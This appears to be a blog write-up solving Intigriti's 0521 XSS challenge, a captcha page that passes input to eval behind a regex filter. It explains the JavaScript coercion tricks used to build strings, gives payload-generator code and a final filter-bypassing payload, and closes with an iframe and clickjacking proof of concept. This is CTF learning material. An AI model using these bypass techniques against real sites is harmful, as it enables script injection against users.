@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Finger+Paint&family=Roboto:wght@100&display=swap" rel="stylesheet">
+        <link href="/fonts/meslo.ttf" rel="stylesheet">
+        <title>Intigriti&#39;s 0521 XSS Challenge - A possible solution</title>        
+    <link rel="stylesheet" href="/assets/404.b2188d1d.css" /></head>
+
+    <body class="
+        bg-[#3a3e4a]
+        font-meslo
+        pb-5
+
+        flex
+        flex-col
+
+        pt-[2vh]
+        pr-[25vh]
+        pl-[25vh]
+        gap-5
+    ">
+      <div class="
+        flex 
+        flex-row 
+        truncate
+        gap-5
+      ">
+        <div class="
+          flex
+          border-dashed
+          border-2
+          border-gray-500
+          rounded-lg
+        ">
+          <div class="
+	bg-[#464b59]
+	rounded-lg
+	text-white
+	p-5
+">
+	<div class="
+    p-4
+    font-bold
+    text-3xl
+    text-center
+    hover:animate-waving-hand
+">
+    <button onclick="
+        (document.referrer.includes(document.location.host)
+        && document.location.origin + '/' == document.referer
+        )
+        ? window.history.back()
+        : window.location.href = '/'
+    ">👈</button>
+</div>
+</div>
+        </div>
+        <div class="
+          rounded-lg
+          shrink grow
+          border-dashed
+          border-2
+          border-gray-500
+        ">
+          <div class="
+	bg-[#464b59]
+	rounded-lg
+	text-white
+	p-5
+">
+	<div class="
+	p-2
+	font-navpost
+	text-center
+  text-yellow-300
+	text-3xl
+">
+	<a href="intigriti-xss-challenge-0521">
+		Intigriti&#39;s 0521 XSS Challenge - A possible solution
+	</a>
+</div>
+
+<p class="
+	font-sans
+	text-center
+  text-gray-300
+	italic 
+	hover:not-italic">
+	Reading time: 7 minutes
+</p>
+</div>
+        </div>
+      </div>
+
+    <div class="
+      bg-[#434854]
+      rounded-lg
+      text-gray-300
+      tracking-wider
+      px-8
+
+      cursor-auto
+
+      border-dashed
+      border-2
+      border-gray-500
+      
+      min-w-full
+      static
+      gap-1
+      leading-7
+
+      prose
+      prose-headings:text-yellow-400
+      prose-em:text-yellow-400
+
+      prose-a:text-yellow-400 
+      hover:prose-a:text-yellow-600
+      prose-a:cursor-pointer
+
+      prose-code:text-yellow-400
+      prose-code:before:content-['']
+      prose-code:after:content-['']
+
+      prose-strong:text-yellow-400
+      
+      prose-img:rounded-xl
+      prose-img:min-w-full
+
+      prose-img:outline
+      prose-img:outline-offset-2 
+      prose-img:outline-4
+
+      prose-pre:outline
+      prose-pre:outline-offset-2 
+      prose-pre:outline-4
+
+      text-lg
+      text-justify
+      prose-h1:before:content-['#_']
+      prose-h2:before:content-['#_']
+      prose-h3:before:content-['#_']
+      prose-h4:before:content-['#_']
+      prose-h5:before:content-['#_']
+      
+      prose-h1:text-2xl
+      prose-h2:text-xl
+      prose-h3:text-xl
+      prose-h4:text-xl
+      prose-h5:text-xl
+      
+      prose-h1:leading-8
+      prose-h2:leading-8
+      prose-h3:leading-8
+      prose-h4:leading-8
+      prose-h5:leading-8
+      
+      prose-h1:font-navpost
+      prose-h2:font-navpost
+      prose-h3:font-navpost
+      prose-h4:font-navpost
+      prose-h5:font-navpost
+
+      list-inside
+      marker:text-yellow-400
+    " id="post">
+      <div class="
+          prose-img:border-4
+          prose-img:border-gray-500
+        ">
+          <img src="/images/test.png">
+        </div>
+      <h2 id="introduction">Introduction</h2>
+<p>This write-up aims to demonstrate a solution to the <a href="https://twitter.com/intigriti/status/1399317852788830211" target="_blank" rel="noopener noreferrer">Intigriti’s 0521 XSS challenge</a>, which was created by <a href="https://twitter.com/GrumpinouT" target="_blank" rel="noopener noreferrer">@GrumpinouT</a>.</p>
+<p><strong>Table of contents</strong>:</p>
+<ul>
+<li><a href="#Recon">Recon</a></li>
+<li><a href="#Concepts-review">Concepts review</a></li>
+<li><a href="#Exploration">Exploration</a></li>
+<li><a href="#Proof-of-Concept">Proof-of-Concept</a></li>
+</ul>
+<h2 id="recon">Recon</h2>
+<p>The application is a simple <a href="https://pt.wikipedia.org/wiki/CAPTCHA" target="_blank" rel="noopener noreferrer">captcha</a> implementation based on a verification of a sum calculation. When a user clicks on <code>Submit</code> button, the <code>calc</code> function is called.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">calc</span><span style="color: #F8F8F2">() {</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> operation </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> a.innerText </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> b.innerText </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> c.value;</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #88846F">/* Allow letter 'e' because: https://en.wikipedia.org/wiki/E_(mathematical_constant) */</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (</span><span style="color: #F92672">!</span><span style="color: #F8F8F2">operation.</span><span style="color: #A6E22E">match</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">/</span><span style="color: #AE81FF">[a-df-z&#x3C;>()!\\='"]</span><span style="color: #E6DB74">/</span><span style="color: #F92672">gi</span><span style="color: #F8F8F2">)) { </span></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (d.innerText </span><span style="color: #F92672">==</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">eval</span><span style="color: #F8F8F2">(operation)) {</span></span>
+<span class="line"><span style="color: #F8F8F2">          </span><span style="color: #A6E22E">alert</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"🚫🤖 Congratulations, you're not a robot!"</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">        }</span></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #F92672">else</span><span style="color: #F8F8F2"> {</span></span>
+<span class="line"><span style="color: #F8F8F2">          </span><span style="color: #A6E22E">alert</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"🤖 Sorry to break the news to you, but you are a robot!"</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">        }</span></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #A6E22E">setNewNumber</span><span style="color: #F8F8F2">();</span></span>
+<span class="line"><span style="color: #F8F8F2">    }</span></span>
+<span class="line"><span style="color: #F8F8F2">    c.value </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">""</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span></code></pre>
+<p>The content of <code>calc</code> function is shown above. It gets three values to calculate:</p>
+<ul>
+<li><code>a.innerText</code>: It represents a number randomly generated used as an operand.</li>
+<li><code>b.innerText</code>: It represents the <code>+</code> signal.</li>
+<li><code>c.value</code>: It represents the value provided by the user via <code>input</code> HTML tag.</li>
+</ul>
+<p>Then, the concatenation of these three values becomes a parameter of <code>eval</code>function. The <code>d.innerText</code> represents the result of sum, which is compared with the result of <code>eval</code> function execution. Thus, the data source arises from <code>input</code> HTML tag and the sink function is the <code>eval</code> function itself.</p>
+<p>The execution flow between the data source and sink function has a Regex sanitizing the input, which allows: e, [], `, +, numbers and etc.</p>
+<h2 id="concepts-review">Concepts review</h2>
+<h3 id="global-variables">Global variables</h3>
+<p>The <code>window.name</code> is a global variable in which its content is maintained by the browser, including through different origins <a href="#References">[1]</a>. Hence, it is possible to set the <code>window.name</code> content, redirect to another website, and then see the same value.</p>
+<p>All HTML tags can be accessed in JavaScript via its <code>id</code> value <a href="#References">[2]</a>. If an input tag was defined as <code>&#x3C;input id="test" value"hello"></code>, the command <code>test.value</code> returns the string <code>hello</code>. In contrast, if before access has a variable defined with the same name of the id, it is only possible to access via <code>window['test']</code>.</p>
+<h3 id="tostring">toString</h3>
+<p>In JavaScript is possible to make any string concatenation, regardless of content type <a href="#References">[3]</a>. This is possible due to <code>toString</code> function. Example: When a string is concatenated with an integer, the integer value is converted to string automatically via <code>toString</code> function execution. It occurs in the same way when a string is concatenated with objects and etc. In the sandbox below are shown some results of different types of concatenation.</p>
+<iframe height="400px" width="100%" src="https://flems.io/#0=N4IgzgpgNhDGAuEAmIBcICGAHLA6AVmCADQgBmAljEagNqgB2GAthGpjgUabAPYOIB7PgzC8YuKLwDmACgDkGeQAIA1MoCMASgDcAHQYixEqXMUr1wAL66DR8REkyFStW+u3D-Y49MuLyta4AEa6JODQcPAU3uwAzKgATAAsIFYAulZAA"></iframe>
+<h2 id="exploration">Exploration</h2>
+<h3 id="generating-strings">Generating strings</h3>
+<p>Based on the information observed in the previous section, it is possible to create strings using characters allowed by sanitizer (regex) and string concatenation.</p>
+<p>Example creating the string <code>fine</code>.</p>
+<p>The concatenation of <code>'' + {}.b</code> results in <code>undefined</code> as shown before, but the sanitizer does not allow single quotes and any alphabet character different from <code>e</code>. However, the character <code>e</code> can be used and it represents a <code>process</code> HTML tag as shown below.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">&#x3C;</span><span style="color: #F92672">progress</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">id</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"e"</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">value</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"0"</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">max</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"100"</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">style</span><span style="color: #F8F8F2">=</span><span style="color: #E6DB74">"display:none"</span><span style="color: #F8F8F2">>&#x3C;/</span><span style="color: #F92672">progress</span><span style="color: #F8F8F2">></span></span></code></pre>
+<p>One way to create the word <code>fine</code> is shown in the sandbox below.</p>
+<iframe height="400px" width="100%" src="https://flems.io/#0=N4IgtglgJlA2CmIBcBGADGgNCAZhBAzsgNqgB2AhmIkiAHQAWALmLCNgMYD2ZT8vyEAB4ADgCcuAczHwCBAATQAvAB0Q8NfIBuFWAFd4qkGk1gKADyPoTIeQSYBPBEagQCI2BQdIyPDSAA+IQB6cSkZOQD2EAJ4BA4mCB4iWjQkADYAThAAX0xyKhp6ACsiTh4+AVpuMnt5Go4KJnkleXg6eABqeABuFTIagi4EOlgpAAoGpoBKPoHk5rwyeBb5YimmAF1iNG2AFk35TrWN7d3iAFZD4-WeRq2d7fTrk7ums+2Adk25weH2saScZLeCzfrRbhgET4eBiQQAIwo8Li0Vi8USyUEAGZUAAOXKbHJAA"></iframe><br><br>
+<p>The sandbox shows a concatenation of <code>e.e+e</code>, which means:</p>
+<ul>
+<li>e.e: Access the <code>process</code> HTML tag and get the content of the property <code>e</code>. As <code>e.e</code> does not exist, it returns <code>undefined</code>.</li>
+<li>+e: It is used only to force a concatenation.</li>
+<li>JavaScript interpretation (almost): <code>e.e.toString() + e.toString()</code>.</li>
+</ul>
+<h3 id="from-an-html-tag-to-eval">From an HTML tag to eval</h3>
+<p>The goal of this challenge is to execute <code>alert(document.domain)</code>, which implies the execution of some function. As parentheses are not allowed to use, functions can be called through <code>``</code>.</p>
+<p>Even though the input provided by the user goes to an <code>eval</code> function, a payload like <code>eval(name)</code> could not be used. This happens because the payload cannot use these characters and the payload will look like with a concatenation of a string. Hence, this results in a execution like <code>eval([e.e+e]+...)</code>.</p>
+<p>This string problem could be solved with a payload using a template string like <code>`${eval(name)}`</code>, which results in an execution of <code>eval("`${eval(name)}`")</code>. Consequently, it is necessary to create the string <code>`${eval(name)}`</code> with string concatenation and set the content of <code>window.name</code> to <code>alert(document.domain)</code>.</p>
+<p>The object <code>e</code> has access to <code>alert</code> or <code>eval</code> functions directly through <code>e.ownerDocument.defaultView.</code> or <code>e.getRootNode().defaultView</code>, but these are long strings and it introduces a problem: the server does not allow a huge quantity of characters in GET requests.</p>
+<p>In JavaScript, it is possible to create functions and execute them through <code>constructor.bind</code>. Thus, if the object <code>e</code> has a function property, it is completely exploitable.</p>
+<p>In the sandbox below is shown the object <code>e</code> accessing the <code>blur</code> function, which results in an execution of <code>console.log("EffectRenan")</code>.</p>
+<iframe height="400px" width="100%" src="https://flems.io/#0=N4IgtglgJlA2CmIBcBGADGgNCAZhBAzsgNqgB2AhmIkiAHQAWALmLCNgMYD2ZT8vyEAB4ADgCcuAczHwCBAATQAvAB0Q8NfIBuFWAFd4qkGk1gKADyPoTIeQSYBPBEagQCI2BQdIyPDSAA+IQB6cSkZOQD2EAJ4BA4mCB4iWjQkADYAThAAX0xyKhp6ACsiTh4+AVpg4PkAMT0yBKSyeQ4ZCiYuMRUm5KZ5AH0cRuaeeSV5eGI1ACN9HpAAXRmQbjJ7MT0E7rUVuYgyKD2ACgBKAG5e3pr5AGEOxLJJeQp5EabEnl71+3kwBwNT4tCZDD5jMgnNS-LgIOiwKQnADkAFEcDh4AkAEr8ChkJFnNSXa5kW53XSwQ4vJgMeDvUZfMi9AFAiHnC7RbhgET4eBiQSzCizOLRWLxRkpEAAdlQAGZcksckA"></iframe><br><br>
+<p>Adaptaing this payload into a single line execution: <code>e["blur"]["constructor"]["bind"]()("console.log('EffectRenan')")();</code></p>
+<h3 id="generating-the-payload">Generating the payload</h3>
+<p>As the payload shown previously cannot use parentheses, it is necessary to replace them with <code>``</code>. Instead of the content executed be <code>alert(document.domain)</code> directly, it is preferring following the same approach to execute <code>eval(name)</code> to be able to execute arbitrary JavaScript code easily.</p>
+<p>Some strings need to be created based on string concatenation technique, such as:</p>
+<ul>
+<li>blur</li>
+<li>constructor</li>
+<li>bind</li>
+<li>eval(name)</li>
+</ul>
+<p>To generate all these strings is necessary to have a base string that contains all necessary characters. With the base string <code>[e*e+e+e.e]</code>, which means <code>NaN[object HTMLProgressElement]undefined</code>, it is possible to generate <code>blur</code>, <code>constructor</code> and <code>bind</code>.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> base </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">'[e*e+e+e.e]'</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> concat </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">eval</span><span style="color: #F8F8F2">(base)[</span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">]; </span><span style="color: #88846F">/* NaN[object HTMLProgressElement]undefined */</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">generate</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #FD971F">code</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">=></span><span style="color: #F8F8F2"> {</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">let</span><span style="color: #F8F8F2"> payload </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">''</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">for</span><span style="color: #F8F8F2"> (i </span><span style="color: #F92672">in</span><span style="color: #F8F8F2"> code) {</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">for</span><span style="color: #F8F8F2"> (j </span><span style="color: #F92672">in</span><span style="color: #F8F8F2"> concat) {</span></span>
+<span class="line"><span style="color: #F8F8F2">      </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (code[i] </span><span style="color: #F92672">==</span><span style="color: #F8F8F2"> concat[j]) {</span></span>
+<span class="line"><span style="color: #F8F8F2">        payload </span><span style="color: #F92672">+=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">`</span><span style="color: #F92672">${</span><span style="color: #F8F8F2">base</span><span style="color: #F92672">}</span><span style="color: #E6DB74">[0][</span><span style="color: #F92672">${</span><span style="color: #F8F8F2">j</span><span style="color: #F92672">}</span><span style="color: #E6DB74">]+`</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #F92672">break</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">      }</span></span>
+<span class="line"><span style="color: #F8F8F2">    }</span></span>
+<span class="line"><span style="color: #F8F8F2">  }</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> payload.</span><span style="color: #A6E22E">slice</span><span style="color: #F8F8F2">(</span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">, payload.length </span><span style="color: #F92672">-</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span></code></pre>
+<p>The above code shows the behavior of a function to generate all strings automatically. This function gets each character from <code>code</code> parameter and try to find a character in
+<code>concat</code> string, which represents <code>NaN[objectHTMLProgressElement]undefined</code>. When there is a match, the payload variable add in itself a new content based on the base string and a position where was found the character. The sandbox below shows all steps to generate the <code>bind</code> string.</p>
+<iframe height="620px" width="100%" src="https://flems.io/#0=N4IgtglgJlA2CmIBcBGADGgNCAZhBAzsgNqgB2AhmIkiAHQAWALmLCNgMYD2ZT8vyEAB4ADgCcuAczHwCBAATQAvAB0Q8NfIBuFWAFd4qkGk1gKADyPoTIeQSYBPBEagQCI2BQdIyPDSAA+IQB6cSkZOQD2EAJ4BA4mCB4iWjQkADYAThAAX0xyKhp6ACsiTh4+AVpuMnt5ACMKWPkleQByYngAKngAaj74OngAXTaAbhUyGrqajgomFvl4HVgACkbYgEpiNGGx+WCu+QA5CmPiLnri+AT5AAkAFQBZABkABQlpWQIAUQRqXjDPRkKDwPBkeBQeRdYKTSbTBaSfjwMTzeCLbigloBeTASbyeQIBYiLywLgUKGtNrjOFkAk4LhieSrCCKOmY+CbXH4gnyBlM1bFNnyWbzLl4um8gkQHDMjnECDDFqtUVMYjFYbinlSgnTLgIOhkySrAAGABJgPLFTkkPILRt4DkdsNiBbijlhr0TZsJpKdfISU5yVDeq1zcAHU7dq7gO7PSbff6CfUZBQANaJnU5bXybOSvMEnkyJh6MR0wNkil0AiwCAceCrLAB0nBw38SRMBjyAC08hQPsmeaRENRfFWbXqEBBbR90Vi8USyUEmSQACZsh6ckA"></iframe><br><br>
+<p>As all functions definition when aplied <code>toString</code> returns a content similar to <code>function name() { [native code] }</code>, the <code>blur</code> function can be used as a base string to <code>eval(name)</code>. Thus, the concatanation can be, <code>e["blur"]+e</code>, which means <code>function blur() { [native code] }[object HTMLProgressElement]</code>. The code below shows how to generate it.</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">generate</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> (</span><span style="color: #FD971F">code</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">base</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">concat</span><span style="color: #F8F8F2">) </span><span style="color: #66D9EF">=></span><span style="color: #F8F8F2"> {</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">let</span><span style="color: #F8F8F2"> payload </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">''</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">for</span><span style="color: #F8F8F2"> (i </span><span style="color: #F92672">in</span><span style="color: #F8F8F2"> code) {</span></span>
+<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">for</span><span style="color: #F8F8F2"> (j </span><span style="color: #F92672">in</span><span style="color: #F8F8F2"> concat) {</span></span>
+<span class="line"><span style="color: #F8F8F2">      </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (code[i] </span><span style="color: #F92672">==</span><span style="color: #F8F8F2"> concat[j]) {</span></span>
+<span class="line"><span style="color: #F8F8F2">        payload </span><span style="color: #F92672">+=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">`</span><span style="color: #F92672">${</span><span style="color: #F8F8F2">base</span><span style="color: #F92672">}</span><span style="color: #E6DB74">[0][</span><span style="color: #F92672">${</span><span style="color: #F8F8F2">j</span><span style="color: #F92672">}</span><span style="color: #E6DB74">]+`</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #F92672">break</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #F8F8F2">      }</span></span>
+<span class="line"><span style="color: #F8F8F2">    }</span></span>
+<span class="line"><span style="color: #F8F8F2">  }</span></span>
+<span class="line"><span style="color: #F8F8F2">  </span></span>
+<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> payload.</span><span style="color: #A6E22E">slice</span><span style="color: #F8F8F2">(</span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">, payload.length </span><span style="color: #F92672">-</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2">);</span></span>
+<span class="line"><span style="color: #F8F8F2">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> base </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">'[e*e+e+e.e]'</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> concat </span><span style="color: #F92672">=</span><span style="color: #F8F8F2">  </span><span style="color: #A6E22E">eval</span><span style="color: #F8F8F2">(base)[</span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">];</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> blur </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">generate</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'blur'</span><span style="color: #F8F8F2">, base, concat);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> baseEvalName </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">`[e[</span><span style="color: #F92672">${</span><span style="color: #F8F8F2">blur</span><span style="color: #F92672">}</span><span style="color: #E6DB74">]+e]`</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> concatEvalName </span><span style="color: #F92672">=</span><span style="color: #F8F8F2">  </span><span style="color: #A6E22E">eval</span><span style="color: #F8F8F2">(baseEvalName)[</span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">];</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> _eval </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">`</span><span style="color: #F92672">${</span><span style="color: #A6E22E">generate</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'eval'</span><span style="color: #F8F8F2">, baseEvalName, concatEvalName)</span><span style="color: #F92672">}</span><span style="color: #E6DB74">`</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> openParentheses </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">`</span><span style="color: #F92672">${</span><span style="color: #A6E22E">generate</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'('</span><span style="color: #F8F8F2">, baseEvalName, concatEvalName)</span><span style="color: #F92672">}</span><span style="color: #E6DB74">`</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> _name </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">`</span><span style="color: #F92672">${</span><span style="color: #A6E22E">generate</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'name'</span><span style="color: #F8F8F2">, baseEvalName, concatEvalName)</span><span style="color: #F92672">}</span><span style="color: #E6DB74">`</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> closeParentheses </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">`</span><span style="color: #F92672">${</span><span style="color: #A6E22E">generate</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">')'</span><span style="color: #F8F8F2">, baseEvalName, concatEvalName)</span><span style="color: #F92672">}</span><span style="color: #E6DB74">`</span><span style="color: #F8F8F2">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> _evalName </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">`</span><span style="color: #F92672">${</span><span style="color: #F8F8F2">_eval</span><span style="color: #F92672">}</span><span style="color: #E6DB74">+</span><span style="color: #F92672">${</span><span style="color: #F8F8F2">openParentheses</span><span style="color: #F92672">}</span><span style="color: #E6DB74">+</span><span style="color: #F92672">${</span><span style="color: #F8F8F2">_name</span><span style="color: #F92672">}</span><span style="color: #E6DB74">+</span><span style="color: #F92672">${</span><span style="color: #F8F8F2">closeParentheses</span><span style="color: #F92672">}</span><span style="color: #E6DB74">`</span><span style="color: #F8F8F2">;</span></span></code></pre>
+<p>Two things need to be handle yet. When the payload executes the template string <code>${&#x3C;concatenation string>}</code>, which the concatenation string represents <code>eval(name)</code>, it is necessary to put this between comments. This happens because after the template is rendered it returns <code>,</code>, which causes an error. The sandbox below shows a correct execution (returning true) and another causing an error.</p>
+<iframe height="300px" width="100%" src="https://flems.io/#0=N4IgtglgJlA2CmIBcBGADGgNCAZhBAzsgNqgB2AhmIkiAHQAWALmLCNgMYD2ZT8vyEAB4ADgCcuAczHwCBAATQAvAB0Q8NfIBuFWAFd4qkGk1gKADyPoTIeQSYBPBEagQCI2BQdIyPDSAA+IQB6cSkZOQCVMhAAX0xyKhp6ACsiTh4+AVp4YjUAI30xNQBdPJBuMnsxPQ4mLmKQMoKIMihSgAMu4IAqABJgNUqCLgQ6WCkACiYa+ABKNVie4K6OgG5o6NyCotLy4Zna+sbmkHzW9qbVgaGeEbGJyUmUBbjVtfYQAngEOog7wQoJBoOIlWJAA"></iframe><br><br>
+<p>Remembering from recon step, the payload is executed like: <code>&#x3C;number> + payload</code>. Thus, the payload needs to finish the previous command with <code>&#x3C;number>;</code>:</p>
+<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #AE81FF">1</span><span style="color: #F8F8F2">;e[</span><span style="color: #E6DB74">"blur"</span><span style="color: #F8F8F2">][</span><span style="color: #E6DB74">"constructor"</span><span style="color: #F8F8F2">][</span><span style="color: #E6DB74">"bind"</span><span style="color: #F8F8F2">]</span><span style="color: #E6DB74">```/*</span><span style="color: #F92672">${</span><span style="color: #E6DB74">"eval(name)"</span><span style="color: #F92672">}</span><span style="color: #E6DB74">*/```</span></span></code></pre>
+<h3 id="self-xss--clickjacking">Self-XSS &#x26; Clickjacking</h3>
+<p>Once the payload is done, it is possible to exploit XSS only if the victim fills the input HTML tag with the payload. In this challenge, it is possible to use a GET parameter <code>?c</code> to fill it automatically. Unfortunately, this is guessing. As the server has no <code>X-Frame-Options</code> header, it is possible to exploit clickjacking, but the victim still needs to press on <code>Submit</code> button.</p>
+<h2 id="proof-of-concept">Proof-of-Concept</h2>
+<p>Based on an <code>iframe</code>:</p>
+<ol>
+<li>Set <code>window.name</code> to <code>alert(document.domain)</code>.</li>
+<li>Goto to <code>https://challenge-0521.intigriti.io/captcha.php?c=</code> + payload.</li>
+<li>Press on <code>Submit</code> button.</li>
+</ol>
